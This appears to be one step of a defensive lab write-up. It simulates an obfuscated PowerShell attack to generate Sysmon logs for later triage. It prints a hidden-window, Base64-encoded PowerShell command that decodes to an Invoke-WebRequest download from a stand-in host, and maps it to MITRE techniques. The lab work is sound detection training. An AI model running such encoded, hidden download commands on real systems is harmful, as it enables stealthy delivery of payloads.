# Step 2: Simulating an Obfuscated PowerShell Attack

## Goal

Simulate realistic attacker behavior using PowerShell with obfuscation and stealth to trigger security-relevant logs for detection and triage.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| PowerShell | Built-in Windows scripting tool |
| EncodedCommand | Obfuscates payloads to bypass detection |
| Sysmon | Captures execution events for analysis |

---

## Why Use Encoded Commands?

Attackers often hide their intentions by encoding PowerShell commands using Base64. This helps them bypass basic detection tools and log analysis.

Sysmon can help reveal this behavior **even if the window is hidden** or the command is encoded.

---

## Command Used in This Lab

powershell
    powershell.exe -nop -w hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwADoALwAvAGUAbQBvAGMAawAvAGQAbwB3AG4AcwBjAHIAaQBwAHQAIgA=


## Decoded Command
powershell
    Invoke-WebRequest "http://emock/downloadscript"
This command attempts to silently download a script from a fake (nonexistent) domain, mimicking what many real-world attackers do in the first stages of compromise. 


## MITRE ATT&CK Techniques Mapped
| Technique | Description |
|------|---------|
| T1059.001 | PowerShell Execution |
| T1027 | Obfuscated Files or Information |
| T1105 | Remote File Transfer (simulated) |

## Execution Steps
1. Open PowerShell
2. Paste and run the command:
    powershell -nop -w hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwADoALwAvAGUAbQBvAGMAawAvAGQAbwB3AG4AcwBjAHIAaQBwAHQAIgA=
You won't see anything happen -- that's because of the -w hidden flag

## Outcome
This generates a Sysmon Event ID 1 log (process creation) with: 
    Image --> powershell.exe
    CommandLine --> includes -EncodedCommand
    ParentImage --> often another PowerShell or cmd instance
This log will be the focus of investigation in Step 3.